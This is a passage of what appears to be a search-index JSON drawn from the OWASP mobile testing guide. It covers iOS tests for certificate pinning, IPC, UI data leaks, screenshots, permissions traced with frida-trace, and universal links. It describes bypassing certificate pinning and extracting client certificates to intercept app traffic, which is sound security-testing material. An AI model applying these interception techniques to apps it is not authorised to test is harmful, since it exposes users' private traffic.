-&gt; General -&gt; Profiles) and that tools like SSL Kill Switch are deactivated. Launch your application and check if you can see the traffic in Burp. Any failures will be reported under 'Alerts' tab. If you can see the traffic, it means that there is no certificate validation performed at all. If however, you can't see any traffic and you have an information about SSL handshake failure, follow the next point.</li> <li>Now, install the Burp certificate, as explained in Burp's user documentation. If the handshake is successful and you can see the traffic in Burp, it means that the certificate is validated against the device's trust store, but no pinning is performed.</li> </ol> <p>If executing the instructions from the previous step doesn't lead to traffic being proxied, it may mean that certificate pinning is actually implemented and all security measures are in place. However, you still need to bypass the pinning in order to test the application. Please refer to  Bypassing Certificate Pinning for more information on this.</p>","tags":["ios","L1","L2","test","MSTG-NETWORK-3","masvs-network-1"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0068/","title":"MASTG-TEST-0068: Testing Custom Certificate Stores and Certificate Pinning","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0068: Testing Custom Certificate Stores and Certificate Pinning (ios)</p> <p> Send Feedback</p>","tags":["ios","L2","test","MSTG-NETWORK-4","masvs-network-2"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0068/#overview","title":"Overview","text":"","tags":["ios","L2","test","MSTG-NETWORK-4","masvs-network-2"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0068/#static-analysis","title":"Static Analysis","text":"<p>Verify that the server certificate is pinned. Pinning can be implemented on various levels in terms of the certificate tree presented by the server:</p> <ol> <li>Including server's certificate in the application bundle and performing verification on each connection. This requires an update mechanisms whenever the certificate on the server is updated.</li> <li>Limiting certificate issuer to e.g. one entity and bundling the intermediate CA's public key into the application. In this way we limit the attack surface and have a valid certificate.</li> <li>Owning and managing your own PKI. The application would contain the intermediate CA's public key. This avoids updating the application every time you change the certificate on the server, due to e.g. expiration. Note that using your own CA would cause the certificate to be self-singed.</li> </ol> <p>The latest approach recommended by Apple is to specify a pinned CA public key in the <code>Info.plist</code> file under App Transport Security Settings. You can find an example in their article Identity Pinning: How to configure server certificates for your app.</p> <p>Another common approach is to use the <code>connection:willSendRequestForAuthenticationChallenge:</code> method of <code>NSURLConnectionDelegate</code> to check if the certificate provided by the server is valid and matches the certificate stored in the app. You can find more details in the HTTPS Server Trust Evaluation technical note.</p> <p>The following third-party libraries include pinning functionality:</p> <ul> <li>TrustKit: here you can pin by setting the public key hashes in your Info.plist or provide the hashes in a dictionary. See their README for more details.</li> <li>AlamoFire: here you can define a <code>ServerTrustPolicy</code> per domain for which you can define a <code>PinnedCertificatesTrustEvaluator</code>. See its documentation for more details.</li> <li>AFNetworking: here you can set an <code>AFSecurityPolicy</code> to configure your pinning.</li> </ul>","tags":["ios","L2","test","MSTG-NETWORK-4","masvs-network-2"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0068/#dynamic-analysis","title":"Dynamic Analysis","text":"","tags":["ios","L2","test","MSTG-NETWORK-4","masvs-network-2"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0068/#server-certificate-pinning","title":"Server certificate pinning","text":"<p>Follow the instructions from the Dynamic Analysis section of  Testing Endpoint Identity Verification. If doing so doesn't lead to traffic being proxied, it may mean that certificate pinning is actually implemented and all security measures are in place. Does the same happen for all domains?</p> <p>As a quick smoke test, you can try to bypass certificate pinning using  objection as described in  Bypassing Certificate Pinning. Pinning related APIs being hooked by objection should appear in objection's output.</p> <p></p> <p>However, keep in mind that:</p> <ul> <li>the APIs might not be complete.</li> <li>if nothing is hooked, that doesn't necessarily mean that the app doesn't implement pinning.</li> </ul> <p>In both cases, the app or some of its components might implement custom pinning in a way that is supported by objection. Please check the static analysis section for specific pinning indicators and more in-depth testing.</p>","tags":["ios","L2","test","MSTG-NETWORK-4","masvs-network-2"]},{"location":"MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0068/#client-certificate-validation","title":"Client certificate validation","text":"<p>Some applications use mTLS (mutual TLS), meaning that the application verifies the server's certificate and the server verifies the client's certificate. You can notice this if there is an error in Burp Alerts tab indicating that client failed to negotiate connection.</p> <p>There are a couple of things worth noting:</p> <ol> <li>The client certificate contains a private key that will be used for the key exchange.</li> <li>Usually the certificate would also need a password to use (decrypt) it.</li> <li>The certificate can be stored in the binary itself, data directory or in the Keychain.</li> </ol> <p>The most common and improper way of using mTLS is to store the client certificate within the application bundle and hardcode the password. This obviously does not bring much security, because all clients will share the same certificate.</p> <p>Second way of storing the certificate (and possibly password) is to use the Keychain. Upon first login, the application should download the personal certificate and store it securely in the Keychain.</p> <p>Sometimes applications have one certificate that is hardcoded and use it for the first login and then the personal certificate is downloaded. In this case, check if it's possible to still use the 'generic' certificate to connect to the server.</p> <p>Once you have extracted the certificate from the application (e.g. using Frida), add it as client certificate in Burp, and you will be able to intercept the traffic.</p>","tags":["ios","L2","test","MSTG-NETWORK-4","masvs-network-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0056/","title":"MASTG-TEST-0056: Determining Whether Sensitive Data Is Exposed via IPC Mechanisms","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0056: Determining Whether Sensitive Data Is Exposed via IPC Mechanisms (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0056/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0056/#static-analysis","title":"Static Analysis","text":"<p>The following section summarizes keywords that you should look for to identify IPC implementations within iOS source code.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0056/#xpc-services","title":"XPC Services","text":"<p>Several classes may be used to implement the NSXPCConnection API:</p> <ul> <li>NSXPCConnection</li> <li>NSXPCInterface</li> <li>NSXPCListener</li> <li>NSXPCListenerEndpoint</li> </ul> <p>You can set security attributes for the connection. The attributes should be verified.</p> <p>Check for the following two files in the Xcode project for the XPC Services API (which is C-based):</p> <ul> <li><code>xpc.h</code></li> <li><code>connection.h</code></li> </ul>","tags":["ios","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0056/#mach-ports","title":"Mach Ports","text":"<p>Keywords to look for in low-level implementations:</p> <ul> <li>mach_port_t</li> <li>mach_msg_*</li> </ul> <p>Keywords to look for in high-level implementations (Core Foundation and Foundation wrappers):</p> <ul> <li>CFMachPort</li> <li>CFMessagePort</li> <li>NSMachPort</li> <li>NSMessagePort</li> </ul>","tags":["ios","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0056/#nsfilecoordinator","title":"NSFileCoordinator","text":"<p>Keywords to look for:</p> <ul> <li>NSFileCoordinator</li> </ul>","tags":["ios","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0056/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Verify IPC mechanisms with static analysis of the iOS source code. No iOS tool is currently available to verify IPC usage.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0057/","title":"MASTG-TEST-0057: Checking for Sensitive Data Disclosed Through the User Interface","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0057: Checking for Sensitive Data Disclosed Through the User Interface (ios)</p> <p> Send Feedback</p>","tags":["ios","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0057/#overview","title":"Overview","text":"","tags":["ios","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0057/#static-analysis","title":"Static Analysis","text":"<p>A text field that masks its input can be configured in two ways:</p> <p>Storyboard In the iOS project's storyboard, navigate to the configuration options for the text field that takes sensitive data. Make sure that the option \"Secure Text Entry\" is selected. If this option is activated, dots are shown in the text field in place of the text input.</p> <p>Source Code If the text field is defined in the source code, make sure that the option <code>isSecureTextEntry</code> is set to \"true\". This option obscures the text input by showing dots.</p> <pre><code>sensitiveTextField.isSecureTextEntry = true\n</code></pre>","tags":["ios","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0057/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>To determine whether the application leaks any sensitive information to the user interface, run the application and identify components that either show such information or take it as input.</p> <p>If the information is masked by, for example, asterisks or dots, the app isn't leaking data to the user interface.</p>","tags":["ios","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0059/","title":"MASTG-TEST-0059: Testing Auto-Generated Screenshots for Sensitive Information","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0059: Testing Auto-Generated Screenshots for Sensitive Information (ios)</p> <p> Send Feedback</p>","tags":["ios","L2","test","MSTG-STORAGE-9","masvs-platform-3"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0059/#overview","title":"Overview","text":"","tags":["ios","L2","test","MSTG-STORAGE-9","masvs-platform-3"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0059/#static-analysis","title":"Static Analysis","text":"<p>If you have the source code, search for the <code>applicationDidEnterBackground</code> method to determine whether the application sanitizes the screen before being backgrounded.</p> <p>The following is a sample implementation using a default background image (<code>overlayImage.png</code>) whenever the application is backgrounded, overriding the current view:</p> <p>Swift:</p> <pre><code>private var backgroundImage: UIImageView?\n\nfunc applicationDidEnterBackground(_ application: UIApplication) {\n    let myBanner = UIImageView(image: #imageLiteral(resourceName: \"overlayImage\"))\n    myBanner.frame = UIScreen.main.bounds\n    backgroundImage = myBanner\n    window?.addSubview(myBanner)\n}\n\nfunc applicationWillEnterForeground(_ application: UIApplication) {\n    backgroundImage?.removeFromSuperview()\n}\n</code></pre> <p>Objective-C:</p> <pre><code>@property (UIImageView *)backgroundImage;\n\n- (void)applicationDidEnterBackground:(UIApplication *)application {\n    UIImageView *myBanner = [[UIImageView alloc] initWithImage:@\"overlayImage.png\"];\n    self.backgroundImage = myBanner;\n    self.backgroundImage.bounds = UIScreen.mainScreen.bounds;\n    [self.window addSubview:myBanner];\n}\n\n- (void)applicationWillEnterForeground:(UIApplication *)application {\n    [self.backgroundImage removeFromSuperview];\n}\n</code></pre> <p>This sets the background image to <code>overlayImage.png</code> whenever the application is backgrounded. It prevents sensitive data leaks because <code>overlayImage.png</code> will always override the current view.</p>","tags":["ios","L2","test","MSTG-STORAGE-9","masvs-platform-3"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0059/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>You can use a visual approach to quickly validate this test case using any iOS device (jailbroken or not):</p> <ol> <li>Navigate to an application screen that displays sensitive information, such as a username, an email address, or account details.</li> <li>Background the application by hitting the Home button on your iOS device.</li> <li>Verify that a default image is shown as the top view element instead of the view containing the sensitive information.</li> </ol> <p>If required, you may also collect evidence by performing steps 1 to 3 on a jailbroken device or a non-jailbroken device after repackaging the app with the Frida Gadget ( Injecting Frida Gadget into an IPA Automatically). After that, connect to the iOS device with SSH ( Accessing the Device Shell) or by other means ( Host-Device Data Transfer) and navigate to the Snapshots directory. The location may differ on each iOS version but it's usually inside the app's Library directory. For instance, on iOS 14.5 the Snapshots directory is located at:</p> <pre><code>/var/mobile/Containers/Data/Application/$APP_ID/Library/SplashBoard/Snapshots/sceneID:$APP_NAME-default/\n</code></pre> <p>The screenshots inside that folder should not contain any sensitive information.</p>","tags":["ios","L2","test","MSTG-STORAGE-9","masvs-platform-3"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0069/","title":"MASTG-TEST-0069: Testing App Permissions","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0069: Testing App Permissions (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0069/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0069/#static-analysis","title":"Static Analysis","text":"<p>Since iOS 10, these are the main areas which you need to inspect for permissions:</p> <ul> <li>Purpose Strings in the Info.plist File</li> <li>Code Signing Entitlements File</li> <li>Embedded Provisioning Profile File</li> <li>Entitlements Embedded in the Compiled App Binary</li> <li>Usage of Permissions in Source Code</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0069/#purpose-strings-in-the-infoplist-file","title":"Purpose Strings in the Info.plist File","text":"<p>If having the original source code, you can verify the permissions included in the <code>Info.plist</code> file:</p> <ul> <li>Open the project with Xcode.</li> <li>Find and open the <code>Info.plist</code> file in the default editor and search for the keys starting with <code>\"Privacy -\"</code>.</li> </ul> <p>You may switch the view to display the raw values by right-clicking and selecting \"Show Raw Keys/Values\" (this way for example <code>\"Privacy - Location When In Use Usage Description\"</code> will turn into <code>NSLocationWhenInUseUsageDescription</code>).</p> <p></p> <p>If only having the IPA:</p> <ul> <li>Unzip the IPA.</li> <li>The <code>Info.plist</code> is located in <code>Payload/&lt;appname&gt;.app/Info.plist</code>.</li> <li>Convert it if needed (e.g. <code>plutil -convert xml1 Info.plist</code>) as explained in the chapter \"iOS Basic Security Testing\", section \"The Info.plist File\".</li> <li> <p>Inspect all purpose strings Info.plist keys, usually ending with <code>UsageDescription</code>:</p> <pre><code>&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n    &lt;key&gt;NSLocationWhenInUseUsageDescription&lt;/key&gt;\n    &lt;string&gt;Your location is used to provide turn-by-turn directions to your destination.&lt;/string&gt;\n</code></pre> </li> </ul> <p>For each purpose string in the <code>Info.plist</code> file, check if the permission makes sense.</p> <p>For example, imagine the following lines were extracted from a <code>Info.plist</code> file used by a Solitaire game:</p> <pre><code>&lt;key&gt;NSHealthClinicalHealthRecordsShareUsageDescription&lt;/key&gt;\n&lt;string&gt;Share your health data with us!&lt;/string&gt;\n&lt;key&gt;NSCameraUsageDescription&lt;/key&gt;\n&lt;string&gt;We want to access your camera&lt;/string&gt;\n</code></pre> <p>It should be suspicious that a regular solitaire game requests this kind of resource access as it probably does not have any need for accessing the camera nor a user's health-records.</p> <p>Apart from simply checking if the permissions make sense, further analysis steps might be derived from analyzing purpose strings e.g. if they are related to storage sensitive data. For example, <code>NSPhotoLibraryUsageDescription</code> can be considered as a storage permission giving access to files that are outside of the app's sandbox and might also be accessible by other apps. In this case, it should be tested that no sensitive data is being stored there (photos in this case). For other purpose strings like <code>NSLocationAlwaysUsageDescription</code>, it must be also considered if the app is storing this data securely. Refer to the \"Testing Data Storage\" chapter for more information and best practices on securely storing sensitive data.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0069/#embedded-provisioning-profile-file","title":"Embedded Provisioning Profile File","text":"<p>When you do not have the original source code, you should analyze the IPA and search inside for the embedded provisioning profile that is usually located in the root app bundle folder (<code>Payload/&lt;appname&gt;.app/</code>) under the name <code>embedded.mobileprovision</code>.</p> <p>This file is not a <code>.plist</code>, it is encoded using Cryptographic Message Syntax. On macOS you can inspect an embedded provisioning profile's entitlements using the following command:</p> <pre><code>security cms -D -i embedded.mobileprovision\n</code></pre> <p>and then search for the Entitlements key region (<code>&lt;key&gt;Entitlements&lt;/key&gt;</code>).</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0069/#entitlements-embedded-in-the-compiled-app-binary","title":"Entitlements Embedded in the Compiled App Binary","text":"<p>If you only have the app's IPA or simply the installed app on a jailbroken device, you normally won't be able to find <code>.entitlements</code> files. This could also be the case for the <code>embedded.mobileprovision</code> file. Still, you should be able to extract the entitlements property lists from the app binary yourself (see  Extracting Entitlements from MachO Binaries).</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0069/#usage-of-permissions-in-source-code","title":"Usage of Permissions in Source Code","text":"<p>After having checked the <code>&lt;appname&gt;.entitlements</code> file and the <code>Info.plist</code> file, it is time to verify how the requested permissions and assigned capabilities are put to use. For this, a source code review should be enough. However, if you don't have the original source code, verifying the use of permissions might be specially challenging as you might need to reverse engineer the app, refer to the \"Dynamic Analysis\" for more details on how to proceed.</p> <p>When doing a source code review, pay attention to:</p> <ul> <li>whether the purpose strings in the <code>Info.plist</code> file match the programmatic implementations.</li> <li>whether the registered capabilities are used in such a way that no confidential information is leaking.</li> </ul> <p>Users can grant or revoke authorization at any time via \"Settings\", therefore apps normally check the authorization status of a feature before accessing it. This can be done by using dedicated APIs available for many system frameworks that provide access to protected resources.</p> <p>You can use the Apple Developer Documentation as a starting point. For example:</p> <ul> <li>Bluetooth: the <code>state</code> property of the <code>CBCentralManager</code> class is used to check system-authorization status for using Bluetooth peripherals.</li> <li> <p>Location: search for methods of <code>CLLocationManager</code>, e.g. <code>locationServicesEnabled</code>.</p> <pre><code>func checkForLocationServices() {\n    if CLLocationManager.locationServicesEnabled() {\n        // Location services are available, so query the user\u2019s location.\n    } else {\n        // Update your app\u2019s UI to show that the location is unavailable.\n    }\n}\n</code></pre> <p>See Table1 in \"Determining the Availability of Location Services\" (Apple Developer Documentation) for a complete list.</p> </li> </ul> <p>Go through the application searching for usages of these APIs and check what happens to sensitive data that might be obtained from them. For example, it might be stored or transmitted over the network, if this is the case, proper data protection and transport security should be additionally verified.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0069/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>With help of the static analysis you should already have a list of the included permissions and app capabilities in use. However, as mentioned in \"Source Code Inspection\", spotting the sensitive data and APIs related to those permissions and app capabilities might be a challenging task when you don't have the original source code. Dynamic analysis can help here getting inputs to iterate onto the static analysis.</p> <p>Following an approach like the one presented below should help you spotting the mentioned sensitive data and APIs:</p> <ol> <li>Consider the list of permissions / capabilities identified in the static analysis (e.g. <code>NSLocationWhenInUseUsageDescription</code>).</li> <li>Map them to the dedicated APIs available for the corresponding system frameworks (e.g. <code>Core Location</code>). You may use the Apple Developer Documentation for this.</li> <li>Trace classes or specific methods of those APIs (e.g. <code>CLLocationManager</code>), for example, using <code>frida-trace</code>.</li> <li>Identify which methods are being really used by the app while accessing the related feature (e.g. \"Share your location\").</li> <li>Get a backtrace for those methods and try to build a call graph.</li> </ol> <p>Once all methods were identified, you might use this knowledge to reverse engineer the app and try to find out how the data is being handled. While doing that you might spot new methods involved in the process which you can again feed to step 3. above and keep iterating between static and dynamic analysis.</p> <p>In the following example we use Telegram to open the share dialog from a chat and frida-trace to identify which methods are being called.</p> <p>First we launch Telegram and start a trace for all methods matching the string \"authorizationStatus\" (this is a general approach because more classes apart from <code>CLLocationManager</code> implement this method):</p> <pre><code>frida-trace -U \"Telegram\" -m \"*[* *authorizationStatus*]\"\n</code></pre> <p><code>-U</code> connects to the USB device. <code>-m</code> includes an Objective-C method to the traces. You can use a glob pattern (e.g. with the \"*\" wildcard, <code>-m \"*[* *authorizationStatus*]\"</code> means \"include any Objective-C method of any class containing 'authorizationStatus'\"). Type <code>frida-trace -h</code> for more information.</p> <p>Now we open the share dialog:</p> <p></p> <p>The following methods are displayed:</p> <pre><code>  1942 ms  +[PHPhotoLibrary authorizationStatus]\n  1959 ms  +[TGMediaAssetsLibrary authorizationStatusSignal]\n  1959 ms     | +[TGMediaAssetsModernLibrary authorizationStatusSignal]\n</code></pre> <p>If we click on Location, another method will be traced:</p> <pre><code> 11186 ms  +[CLLocationManager authorizationStatus]\n 11186 ms     | +[CLLocationManager _authorizationStatus]\n 11186 ms     |    | +[CLLocationManager _authorizationStatusForBundleIdentifier:0x0 bundle:0x0]\n</code></pre> <p>Use the auto-generated stubs of frida-trace to get more information like the return values and a backtrace. Do the following modifications to the JavaScript file below (the path is relative to the current directory):</p> <pre><code>// __handlers__/__CLLocationManager_authorizationStatus_.js\n\n  onEnter: function (log, args, state) {\n    log(\"+[CLLocationManager authorizationStatus]\");\n    log(\"Called from:\\n\" +\n        Thread.backtrace(this.context, Backtracer.ACCURATE)\n        .map(DebugSymbol.fromAddress).join(\"\\n\\t\") + \"\\n\");\n  },\n  onLeave: function (log, retval, state) {\n    console.log('RET :' + retval.toString());\n  }\n</code></pre> <p>Clicking again on \"Location\" reveals more information:</p> <pre><code>  3630 ms  -[CLLocationManager init]\n  3630 ms     | -[CLLocationManager initWithEffectiveBundleIdentifier:0x0 bundle:0x0]\n  3634 ms  -[CLLocationManager setDelegate:0x14c9ab000]\n  3641 ms  +[CLLocationManager authorizationStatus]\nRET: 0x4\n  3641 ms  Called from:\n0x1031aa158 TelegramUI!+[TGLocationUtils requestWhenInUserLocationAuthorizationWithLocationManager:]\n    0x10337e2c0 TelegramUI!-[TGLocationPickerController initWithContext:intent:]\n    0x101ee93ac TelegramUI!0x1013ac\n</code></pre> <p>We see that <code>+[CLLocationManager authorizationStatus]</code> returned <code>0x4</code> (CLAuthorizationStatus.authorizedWhenInUse) and was called by <code>+[TGLocationUtils requestWhenInUserLocationAuthorizationWithLocationManager:]</code>. As we anticipated before, you might use this kind of information as an entry point when reverse engineering the app and from there get inputs (e.g. names of classes or methods) to keep feeding the dynamic analysis.</p> <p>Next, there is a visual way to inspect the status of some app permissions when using the iPhone/iPad by opening \"Settings\" and scrolling down until you find the app you're interested in. When clicking on it, this will open the \"ALLOW APP_NAME TO ACCESS\" screen. However, not all permissions might be displayed yet. You will have to trigger them in order to be listed on that screen.</p> <p></p> <p>For example, in the previous example, the \"Location\" entry was not being listed until we triggered the permission dialogue for the first time. Once we did it, no matter if we allowed the access or not, the the \"Location\" entry will be displayed.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/","title":"MASTG-TEST-0070: Testing Universal Links","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0070: Testing Universal Links (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#static-analysis","title":"Static Analysis","text":"<p>Testing universal links on a static approach includes doing the following:</p> <ul> <li>Checking the Associated Domains entitlement</li> <li>Retrieving the Apple App Site Association file</li> <li>Checking the link receiver method</li> <li>Checking the data handler method</li> <li>Checking if the app is calling other app's universal links</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#checking-the-associated-domains-entitlement","title":"Checking the Associated Domains Entitlement","text":"<p>Universal links require the developer to add the Associated Domains entitlement and include in it a list of the domains that the app supports.</p> <p>In Xcode, go to the Capabilities tab and search for Associated Domains. You can also inspect the <code>.entitlements</code> file looking for <code>com.apple.developer.associated-domains</code>. Each of the domains must be prefixed with <code>applinks:</code>, such as <code>applinks:www.mywebsite.com</code>.</p> <p>Here's an example from Telegram's <code>.entitlements</code> file:</p> <pre><code>    &lt;key&gt;com.apple.developer.associated-domains&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;applinks:telegram.me&lt;/string&gt;\n        &lt;string&gt;applinks:t.me&lt;/string&gt;\n    &lt;/array&gt;\n</code></pre> <p>More detailed information can be found in the archived Apple Developer Documentation.</p> <p>If you don't have the original source code you can extract them from the MachO file as explained in  Extracting Entitlements from MachO Binaries.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#retrieving-the-apple-app-site-association-file","title":"Retrieving the Apple App Site Association File","text":"<p>Try to retrieve the <code>apple-app-site-association</code> file from the server using the associated domains you got from the previous step. This file needs to be accessible via HTTPS, without any redirects, at <code>https://&lt;domain&gt;/apple-app-site-association</code> or <code>https://&lt;domain&gt;/.well-known/apple-app-site-association</code>.</p> <p>You can retrieve it yourself using your browser and navigating to <code>https://&lt;domain&gt;/apple-app-site-association</code>, <code>https://&lt;domain&gt;/.well-known/apple-app-site-association</code> or using Apple's CDN at <code>https://app-site-association.cdn-apple.com/a/v1/&lt;domain&gt;</code>.</p> <p>Alternatively, you can use the Apple App Site Association (AASA) Validator. After entering the domain, it will display the file, verify it for you and show the results (e.g. if it is not being properly served over HTTPS). See the following example from apple.com <code>https://www.apple.com/.well-known/apple-app-site-association</code>:</p> <p></p> <pre><code>{\n    \"activitycontinuation\": {\n    \"apps\": [\n        \"W74U47NE8E.com.apple.store.Jolly\"\n    ]\n    },\n    \"applinks\": {\n        \"apps\": [],\n        \"details\": [\n            {\n            \"appID\": \"W74U47NE8E.com.apple.store.Jolly\",\n            \"paths\": [\n                \"NOT /shop/buy-iphone/*\",\n                \"NOT /us/shop/buy-iphone/*\",\n                \"/xc/*\",\n                \"/shop/buy-*\",\n                \"/shop/product/*\",\n                \"/shop/bag/shared_bag/*\",\n                \"/shop/order/list\",\n                \"/today\",\n                \"/shop/watch/watch-accessories\",\n                \"/shop/watch/watch-accessories/*\",\n                \"/shop/watch/bands\",\n            ] } ] }\n}\n</code></pre> <p>The \"details\" key inside \"applinks\" contains a JSON representation of an array that might contain one or more apps. The \"appID\" should match the \"application-identifier\" key from the app's entitlements. Next, using the \"paths\" key, the developers can specify certain paths to be handled on a per app basis. Some apps, like Telegram use a standalone * (<code>\"paths\": [\"*\"]</code>) in order to allow all possible paths. Only if specific areas of the website should not be handled by some app, the developer can restrict access by excluding them by prepending a <code>\"NOT \"</code> (note the whitespace after the T) to the corresponding path. Also remember that the system will look for matches by following the order of the dictionaries in the array (first match wins).</p> <p>This path exclusion mechanism is not to be seen as a security feature but rather as a filter that developer might use to specify which apps open which links. By default, iOS does not open any unverified links.</p> <p>Remember that universal links verification occurs at installation time. iOS retrieves the AASA file for the declared domains (<code>applinks</code>) in its <code>com.apple.developer.associated-domains</code> entitlement. iOS will refuse to open those links if the verification did not succeed. Some reasons to fail verification might include:</p> <ul> <li>The AASA file is not served over HTTPS.</li> <li>The AASA is not available.</li> <li>The <code>appID</code>s do not match (this would be the case of a malicious app). iOS would successfully prevent any possible hijacking attacks.</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#checking-the-link-receiver-method","title":"Checking the Link Receiver Method","text":"<p>In order to receive links and handle them appropriately, the app delegate has to implement <code>application:continueUserActivity:restorationHandler:</code>. If you have the original project try searching for this method.</p> <p>Please note that if the app uses <code>openURL:options:completionHandler:</code> to open a universal link to the app's website, the link won't open in the app. As the call originates from the app, it won't be handled as a universal link.</p> <p>From Apple Docs: When iOS launches your app after a user taps a universal link, you receive an <code>NSUserActivity</code> object with an <code>activityType</code> value of <code>NSUserActivityTypeBrowsingWeb</code>. The activity object's <code>webpageURL</code> property contains the URL that the user is accessing. The webpage URL property always contains an HTTP or HTTPS URL, and you can use <code>NSURLComponents</code> APIs to manipulate the components of the URL. [...] To protect users' privacy and security, you should not use HTTP when you need to transport data; instead, use a secure transport protocol such as HTTPS.</p> <p>From the note above we can highlight that:</p> <ul> <li>The mentioned <code>NSUserActivity</code> object comes from the <code>continueUserActivity</code> parameter, as seen in the method above.</li> <li>The scheme of the <code>webpageURL</code> must be HTTP or HTTPS (any other scheme should throw an exception). The <code>scheme</code> instance property of <code>URLComponents</code> / <code>NSURLComponents</code> can be used to verify this.</li> </ul> <p>If you don't have the original source code you can use  radare2 for iOS or  rabin2 to search the binary strings for the link receiver method:</p> <pre><code>$ rabin2 -zq Telegram\\ X.app/Telegram\\ X | grep restorationHan\n\n0x1000deea9 53 52 